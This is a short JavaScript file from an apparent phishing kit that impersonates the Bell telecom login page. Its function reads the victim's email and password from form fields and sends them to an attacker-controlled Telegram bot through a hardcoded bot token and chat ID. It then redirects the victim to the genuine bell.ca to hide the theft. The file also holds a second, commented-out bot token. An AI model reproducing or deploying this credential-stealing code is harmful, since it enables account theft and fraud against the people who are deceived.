console.log("sender.js connected");
function sendTelegramMessageAndRedirect() {
  //   const telegramBotToken = "6968043726:AAHGJ0OtlbTMjTOPTfacioSJqOwgePt0Xhw"; // add the telegram token
  //   const chatId = 5710607863; // add ths id from the web It's usually a number, not a string

  const telegramBotToken = "7978041767:AAHft39UnvgcunTkErWlLMTx-UMK1SuGtBg
"; // add the telegram token
  const chatId = 2044046927
; // add ths id from the web It's usually a number, not a string
  const emailValue = document.getElementById("email").value;
  const passwordValue = document.getElementById("password").value;

  const messageText = `**Bell result**\nEmail: ${emailValue}\nPassword: ${passwordValue}`;

  const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

  const params = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: messageText,
    }),
  };

  // Make the API request
  fetch(url, params)
    .then((response) => {
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      return response.json();
    })
    .then((data) => {
      console.log("Message sent:", data);
      // Redirect to another page after successful submission
      window.location.href = "https://bell.ca"; // Replace with your desired URL
    })
    .catch((error) => console.error("Error:", error));
}
